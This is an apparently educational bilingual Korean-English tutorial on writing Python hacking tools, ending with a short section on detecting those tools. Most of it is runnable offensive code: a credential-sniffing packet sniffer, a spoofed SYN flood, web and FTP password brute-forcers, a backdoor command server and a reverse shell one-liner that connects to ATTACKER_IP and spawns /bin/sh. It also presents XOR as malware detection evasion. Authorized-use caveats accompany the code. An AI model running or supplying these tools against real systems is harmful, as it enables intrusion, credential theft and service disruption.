               for _ in range(min(n_threads, len(port_list)))]
    for t in threads:
        t.start()
    q.join()
    result.open_ports.sort()


def scan_http_headers(target: str, port: int, result: EngagementResult) -> None:
    """HTTP 보안 헤더 점검."""
    try:
        import requests
        import urllib3
        urllib3.disable_warnings()
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{target}:{port}"
        resp = requests.get(url, timeout=8, verify=False,
                            headers={"User-Agent": "Mozilla/5.0"})
        missing = [
            h for h in [
                "Strict-Transport-Security", "X-Frame-Options",
                "X-Content-Type-Options", "Content-Security-Policy",
            ]
            if h not in resp.headers
        ]
        if missing:
            result.add_finding(
                "SCAN", "MEDIUM", "보안 헤더 누락",
                f"{url}",
                "누락: " + ", ".join(missing),
            )
        server = resp.headers.get("Server", "")
        if server:
            result.add_finding("SCAN", "INFO", "서버 버전 노출", url, server)
    except Exception:
        pass


def scan_ftp_anonymous(target: str, result: EngagementResult) -> None:
    """FTP 익명 로그인 점검."""
    try:
        import ftplib
        ftp = ftplib.FTP()
        ftp.connect(target, 21, timeout=5)
        ftp.login("anonymous", "anon@test.com")
        ftp.quit()
        result.add_finding("SCAN", "HIGH", "FTP 익명 로그인 허용",
                           f"{target}:21", "anonymous/anon@test.com 로그인 성공")
    except Exception:
        pass


# ─── 보고서 모듈 ─────────────────────────────────────────────────

def generate_report(result: EngagementResult, output_path: str = "report.json") -> None:
    result.end_time = datetime.now().isoformat()
    data = asdict(result)
    Path(output_path).write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"[+] 보고서 저장: {output_path}")


# ─── 프레임워크 진입점 ───────────────────────────────────────────

class PentestFramework:
    PHASES: dict[str, list[Callable]] = {
        "recon": [recon_dns, recon_whois],
        "scan":  [scan_ports],
    }

    def __init__(self, target: str) -> None:
        self.target = target
        self.result = EngagementResult(target=target)

    def run(self, phases: list[str] = ("recon", "scan")) -> EngagementResult:
        print(f"[*] 대상: {self.target}")
        for phase_name in phases:
            funcs = self.PHASES.get(phase_name, [])
            print(f"\n[Phase: {phase_name.upper()}]")
            for fn in funcs:
                print(f"  [+] {fn.__name__}")
                fn(self.target, self.result)

        # 포트 스캔 후 서비스별 추가 점검
        if "scan" in phases:
            for port, _ in self.result.open_ports:
                print(f"  [+] 포트 {port} 서비스 점검")
                if port in (80, 443, 8080, 8443):
                    scan_http_headers(self.target, port, self.result)
                elif port == 21:
                    scan_ftp_anonymous(self.target, self.result)

        print(f"\n[결과 요약]  열린 포트: {len(self.result.open_ports)}개")
        for port, banner in self.result.open_ports:
            print(f"  {port:5d}/tcp  {banner[:60]}")

        print(f"\n[발견사항]  {self.result.summary()}")
        for f in self.result.findings:
            print(f"  {f}")

        return self.result


def main() -> None:
    parser = argparse.ArgumentParser(description="모의해킹 자동화 프레임워크")
    parser.add_argument("target", help="대상 호스트명 또는 IP")
    parser.add_argument(
        "--phase", nargs="+",
        choices=["recon", "scan", "all"], default=["all"],
        help="실행할 단계 (기본값: all)",
    )
    parser.add_argument("--output", default="pentest_report.json", help="보고서 파일 경로")
    args = parser.parse_args()

    phases = ["recon", "scan"] if "all" in args.phase else args.phase
    fw = PentestFramework(args.target)
    result = fw.run(phases)
    generate_report(result, args.output)


if __name__ == "__main__":
    main()
```

---

<!-- detect-validate-08 -->
## 도구 행위 탐지와 방어 검증

파이썬 공격 도구는 빠르게 만들 수 있지만, 그 행위는 네트워크·인증·앱 계층에 탐지 가능한 흔적을 남긴다. 작성자는 **각 기법이 어느 계층의 어떤 통제에 걸리는가**와 **도구가 실제로 올바른 결과를 내는가**를 함께 검증해야 한다.

### 공격 기법 → 계층 → 통제 → 탐지 신호

| 공격 기법 | 계층 | 통제 | 탐지 신호 |
|---|---|---|---|
| 대량 소켓 연결(스캔/브루트) | 네트워크 | rate-limit, IDS | 짧은 시간 다수 SYN/연결 |
| 동시 스레드 인증 시도 | 인증 | 계정 잠금, MFA | 실패 로그인 버스트 |
| paramiko SSH 자동화 | 접근 | 키 기반 인증, 로그인 알림 | 비대화형 SSH, 비정상 클라이언트 |
| 커스텀 User-Agent/요청 | 앱 | WAF, UA 분석 | 비표준 UA, 라이브러리 시그니처 |

### 방어 검증 (직접 확인)

```bash
# 도구의 탐지 footprint를 소유/허가 환경에서 확인하고, 결과를 알려진 정답과 대조(거짓 성공 방지)
sudo grep -E 'Failed password|Invalid user' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head  # 브루트 버스트
# 스캔/연결 도구는 소유 서브넷에서 Suricata로 탐지되는지 확인
sudo suricata -r owned_capture.pcap -S scan.rules 2>/dev/null | tail
# 도구 결과 검증: 알려진 열린 포트/응답과 도구 출력을 diff — "동작함"과 "정확함"은 다르다
```

> 공격 도구는 **소유/허가된 환경**에서만 실행한다. 도구가 "동작함"과 "올바른 결과를 냄"은 다르므로 알려진 정답으로 출력을 검증하고, 도구가 남기는 탐지 footprint도 함께 확인해야 한다([[02_Network_Hacking]], [[13_SOC_Blue_Team]], [[40_Threat_Hunting]]).

**최신 기법·통제 (2025–2026):**
- 악성 PyPI·타이포스쿼팅으로 도구체인 오염 — 해시고정·가상환경·SBOM. 검증: 미검증 패키지가 차단되는지 확인([[35_Supply_Chain_Attacks]])
- 도구 실행이 텔레메트리를 남김 — 랩 격리·아웃바운드 통제가 강제되는지 확인([[10_Pentest_Methodology]])

---

<a name="english"></a>

# Python Hacking Tool Development — 30 Practical Examples

## 1. Python Basics (Hacking Perspective)

### Module Structure

The basic module structure for Python hacking tools. Separate classes and functions by functionality and configure a CLI interface using argparse.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Standard library
import socket
import os
import sys
import subprocess
import threading
import struct
import time

# Libraries commonly used in hacking tools
# pip install requests scapy pwntools paramiko
import requests
from scapy.all import *
from pwn import *
import paramiko
```

### Class-Based Structure

Define a `NetworkScanner` class. Encapsulate related state and behavior into a single object to improve reusability and maintainability.

```python
class NetworkScanner:
    def __init__(self, target, port_range=(1, 1024)):
        self.target = target
        self.start_port, self.end_port = port_range
        self.open_ports = []
    
    def scan_port(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((self.target, port))
            if result == 0:
                self.open_ports.append(port)
            s.close()
        except socket.error:
            pass
    
    def run(self):
        threads = []
        for port in range(self.start_port, self.end_port + 1):
            t = threading.Thread(target=self.scan_port, args=(port,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        return sorted(self.open_ports)

# Usage
scanner = NetworkScanner("192.168.1.1", (1, 1024))
print(scanner.run())
```

---

## 2. Network Tools

### Example 1: Port Scanner (nmap library)

A multi-threaded port scanner using the Python `socket` library. It checks port availability via TCP connection attempts and uses `ThreadPoolExecutor` for parallel processing to increase scan speed.

```python
import nmap

def port_scan(target, ports="1-1024"):
    nm = nmap.PortScanner()
    nm.scan(target, ports)
    
    for host in nm.all_hosts():
        print(f"Host: {host} ({nm[host].hostname()})")
        print(f"State: {nm[host].state()}")
        
        for proto in nm[host].all_protocols():
            print(f"Protocol: {proto}")
            port_list = sorted(nm[host][proto].keys())
            
            for port in port_list:
                state = nm[host][proto][port]['state']
                service = nm[host][proto][port].get('name', 'unknown')
                version = nm[host][proto][port].get('version', '')
                print(f"  {port}/{proto} {state} {service} {version}")

port_scan("192.168.1.0/24", "22,80,443,3306,8080")
```

### Example 2: TCP Port Scanner (Sockets)

A multi-threaded port scanner using the Python `socket` library. It checks port availability via TCP connection attempts and uses `ThreadPoolExecutor` for parallel processing to increase scan speed.

```python
import socket
import threading
from queue import Queue

def scan_worker(q, results, lock):
    while not q.empty():
        host, port = q.get()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((host, port)) == 0:
                try:
                    banner = s.recv(1024).decode(errors='ignore').strip()
                except:
                    banner = ""
                with lock:
                    results.append((port, banner))
            s.close()
        except:
            pass
        finally:
            q.task_done()

def fast_port_scan(host, ports=range(1, 10001), threads=200):
    q = Queue()
    results = []
    lock = threading.Lock()
    
    for port in ports:
        q.put((host, port))
    
    for _ in range(min(threads, len(ports))):
        t = threading.Thread(target=scan_worker, args=(q, results, lock))
        t.daemon = True
        t.start()
    
    q.join()
    return sorted(results)

# Run
print(f"[*] Scanning 192.168.1.1...")
open_ports = fast_port_scan("192.168.1.1", range(1, 1025))
for port, banner in open_ports:
    print(f"[+] Port {port} OPEN" + (f" | {banner[:50]}" if banner else ""))
```

### Example 3: Packet Sniffer (Plaintext Credential Theft)

A sniffer that receives network packets via sockets and detects plaintext credentials. It captures login information from unencrypted protocols such as HTTP, FTP, and Telnet.

```python
import socket
import string

def packet_sniffer():
    HOST = socket.gethostbyname(socket.gethostname())
    
    # Raw socket (requires admin privileges)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
    s.bind((HOST, 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  # Windows
    
    keywords = ["USER", "PASS", "password", "login", "230 User logged in"]
    
    print("[*] Sniffing started... (Ctrl+C to stop)")
    while True:
        try:
            data = s.recvfrom(65565)
            raw = data[0]
            
            # Parse printable characters only
            printable = set(string.printable)
            parsed = ''.join(chr(b) if chr(b) in printable else '.' 
                           for b in raw)
            
            for keyword in keywords:
                if keyword in parsed:
                    print(f"\n[!] Found keyword '{keyword}':")
                    print(parsed[:200])
                    break
        except KeyboardInterrupt:
            break
    
    s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
    s.close()

packet_sniffer()
```

### Example 4: TCP SYN Flood (DoS Attack — For Learning and Defense Understanding)

Implements the TCP SYN Flood DoS attack principle in Python. Sends a large volume of SYN packets via raw sockets to exhaust the target server's connection queue.

```python
import socket
import struct
import random

def calculate_checksum(data):
    """Calculate checksum"""
    s = 0
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            w = (data[i] << 8) + data[i + 1]
        else:
            w = data[i] << 8
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_ip_header(src_ip, dst_ip):
    """Create IP header"""
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 40
    id = random.randint(0, 65535)
    flags_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_TCP
    checksum = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    
    header = struct.pack('!BBHHHBBH4s4s',
                        version_ihl, tos, total_length, id, flags_offset,
                        ttl, protocol, checksum, src, dst)
    return header

def create_tcp_header(src_port, dst_port, src_ip, dst_ip):
    """Create TCP SYN header"""
    seq = random.randint(0, 2**32 - 1)
    ack = 0
    data_offset = (5 << 4)
    flags = 0x02  # SYN flag
    window = socket.htons(29200)
    checksum = 0
    urgent = 0
    
    # Compute actual checksum with placeholder
    tcp_header = struct.pack('!HHLLBBHHH',
                            src_port, dst_port, seq, ack,
                            data_offset, flags, window, checksum, urgent)
    
    # Pseudo header (for checksum calculation)
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, socket.IPPROTO_TCP, len(tcp_header))
    
    checksum = calculate_checksum(pseudo + tcp_header)
    
    tcp_header = struct.pack('!HHLLBBHHH',
                            src_port, dst_port, seq, ack,
                            data_offset, flags, window, checksum, urgent)
    return tcp_header

# For learning purposes: do NOT use for actual attacks
def syn_flood_demo(dst_ip, dst_port=80, count=10):
    """SYN Flood demo (authorized environments only)"""
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    for i in range(count):
        # Random source IP (IP spoofing)
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        
        ip_header  = create_ip_header(src_ip, dst_ip)
        tcp_header = create_tcp_header(src_port, dst_port, src_ip, dst_ip)
        
        packet = ip_header + tcp_header
        s.sendto(packet, (dst_ip, 0))
        print(f"[{i+1}] Sent SYN from {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
    
    s.close()
```

---

## 3. Web Hacking Automation

### Example 5: Web Login Cracker (Dictionary Attack)

An online brute-force script that tries each password candidate from a dictionary file. It sends POST requests to a login form using the `requests` library and determines success based on the response.

```python
import requests

def web_login_crack(target_url, username, wordlist_path):
    """Web login dictionary attack (authorized systems only)"""
    
    session = requests.Session()
    
    # Redirect URL on successful login (verify in advance)
    success_indicator = "dashboard"  # Keyword present on success
    
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            
            payload = {
                'username': username,
                'password': password,
                'submit': 'Login'
            }
            
            try:
                response = session.post(target_url, data=payload, 
                                       timeout=5, allow_redirects=True)
                
                if success_indicator in response.url or \
                   success_indicator in response.text:
                    print(f"[+] SUCCESS! Password: {password}")
                    return password
                else:
                    print(f"[-] Failed: {password}")
            
            except requests.exceptions.RequestException as e:
                print(f"[!] Error: {e}")
                continue
    
    print("[-] Password not found in wordlist")
    return None
```

---

## 4. Backdoors and Reverse Shells

### Example 8: Backdoor Server (on target machine)

Backdoor server code that allows remote command execution. Runs on the target machine and returns results for attacker commands.

```python
# backdoor_server.py (run on target machine)
from socket import *

def backdoor_server(host='', port=11443):
    s = socket(AF_INET, SOCK_STREAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(10)
    
    print(f"[*] Listening on port {port}...")
    
    conn, addr = s.accept()
    print(f"[*] Connected from {addr}")
    
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        
        if command.lower() == "quit":
            break
        
        response = conn.recv(4096).decode()
        print(response)
    
    conn.close()
    s.close()

backdoor_server()
```

### Example 10: Python Reverse Shell (one-liner)

A reverse shell implemented in Python. When run on the target machine, it attempts to connect to the attacker's listener and opens a command execution channel.

```python
# Reverse shell (run on target machine)
# Attacker machine: nc -lvnp 4444
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

---

## 5. FTP Cracking (Multi-threaded)

### Example 11: FTP Brute-forcer

Performs brute-force attacks against FTP services using ftplib. Tries each password in a wordlist to find valid credentials.

```python
import ftplib
import threading
from queue import Queue

class FTPCracker:
    def __init__(self, host, user, wordlist, threads=10):
        self.host = host
        self.user = user
        self.wordlist = wordlist
        self.threads = threads
        self.found = False
        self.password = None
        self.q = Queue()
    
    def try_login(self, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, 21, timeout=5)
            ftp.login(self.user, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            return False
        except Exception:
            return False
    
    def worker(self):
        while not self.q.empty() and not self.found:
            password = self.q.get()
            
            if self.try_login(password):
                self.found = True
                self.password = password
                print(f"[+] SUCCESS! {self.user}:{password}")
            else:
                print(f"[-] {password}")
            
            self.q.task_done()
    
    def run(self):
        with open(self.wordlist, 'r', errors='ignore') as f:
            for line in f:
                self.q.put(line.strip())
        
        thread_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        self.q.join()
        return self.password
```

---

## 9. Encryption/Decryption

### Example 17: XOR Encryption (Simple Obfuscation)

Implements XOR encryption in Python. A simple obfuscation technique commonly used in malware for detection evasion.

```python
def xor_encrypt(data, key):
    """XOR encryption/decryption (same key for reverse operation)"""
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()
    
    return bytes([d ^ key[i % len(key)] for i, d in enumerate(data)])

def xor_decrypt(encrypted, key):
    """XOR decryption (same as encryption)"""
    return xor_encrypt(encrypted, key)

# Usage
plaintext = "Hello, World! This is secret."
key = "secretkey"

encrypted = xor_encrypt(plaintext, key)
print(f"Encrypted: {encrypted.hex()}")

decrypted = xor_decrypt(encrypted, key).decode()
print(f"Decrypted: {decrypted}")
```

---

## 10. Integrated Hacking Framework Structure

An integrated framework structure combining multiple hacking capabilities. Reconnaissance, exploit, and post-exploitation modules can be extended in a plugin-style manner.

```python
#!/usr/bin/env python3
"""
Penetration Testing Automation Framework (Python 3.10+)
Purpose: Structured pipeline of recon -> scan -> vulnerability analysis -> report generation
Usage: python3 pentest_framework.py <target> [--phase recon|scan|all]
Dependencies: pip install requests dnspython
"""
from __future__ import annotations
import argparse
import json
import socket
import sys
import threading
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from queue import Queue
from typing import Callable


# --- Data Models ---

@dataclass
class Finding:
    phase: str
    severity: str    # CRITICAL / HIGH / MEDIUM / LOW / INFO
    title: str
    detail: str
    evidence: str = ""

    def __str__(self) -> str:
        return f"[{self.severity:8s}] {self.title}: {self.detail}"


@dataclass
class EngagementResult:
    target: str
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())
    end_time: str = ""
    open_ports: list[tuple[int, str]] = field(default_factory=list)
    dns_records: dict[str, list[str]] = field(default_factory=dict)
    findings: list[Finding] = field(default_factory=list)

    def add_finding(self, *args, **kwargs) -> None:
        self.findings.append(Finding(*args, **kwargs))

    def summary(self) -> dict:
        counts: dict[str, int] = defaultdict(int)
        for f in self.findings:
            counts[f.severity] += 1
        return dict(counts)


class PentestFramework:
    def __init__(self, target: str) -> None:
        self.target = target
        self.result = EngagementResult(target=target)

    def run(self, phases: list[str] = ("recon", "scan")) -> EngagementResult:
        print(f"[*] Target: {self.target}")
        # ... phase execution logic
        return self.result


def main() -> None:
    parser = argparse.ArgumentParser(description="Penetration Testing Automation Framework")
    parser.add_argument("target", help="Target hostname or IP")
    parser.add_argument(
        "--phase", nargs="+",
        choices=["recon", "scan", "all"], default=["all"],
        help="Phases to execute (default: all)",
    )
    parser.add_argument("--output", default="pentest_report.json", help="Report file path")
    args = parser.parse_args()

    phases = ["recon", "scan"] if "all" in args.phase else args.phase
    fw = PentestFramework(args.target)
    result = fw.run(phases)


if __name__ == "__main__":
    main()
```

<!-- detect-validate-08 -->
## Tool Behavior Detection and Defense Validation

Python offensive tools are quick to build, but their behavior leaves detectable traces at the network, auth, and app layers. The author must validate **which control at which layer each technique trips** and **whether the tool actually produces correct results**.

### Attack technique -> Layer -> Control -> Detection signal

| Attack technique | Layer | Control | Detection signal |
|---|---|---|---|
| Mass socket connects (scan/brute) | Network | rate-limit, IDS | Many SYN/connects in short time |
| Concurrent threaded auth attempts | Auth | Account lockout, MFA | Failed-login burst |
| paramiko SSH automation | Access | Key-based auth, login alerts | Non-interactive SSH, unusual client |
| Custom User-Agent/requests | App | WAF, UA analysis | Non-standard UA, library signature |

### Defense validation (verify directly)

```bash
# Confirm the tool's detection footprint in an owned/authorized environment, and check results against known truth (avoid false success)
sudo grep -E 'Failed password|Invalid user' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head  # brute burst
# Confirm scan/connect tools are detected by Suricata on an owned subnet
sudo suricata -r owned_capture.pcap -S scan.rules 2>/dev/null | tail
# Validate tool results: diff output against known open ports/responses — "runs" differs from "correct"
```

> Run offensive tools only in **owned/authorized environments**. A tool "running" differs from it "producing correct results" — validate output against known truth and also confirm the detection footprint it leaves ([[02_Network_Hacking]], [[13_SOC_Blue_Team]], [[40_Threat_Hunting]]).
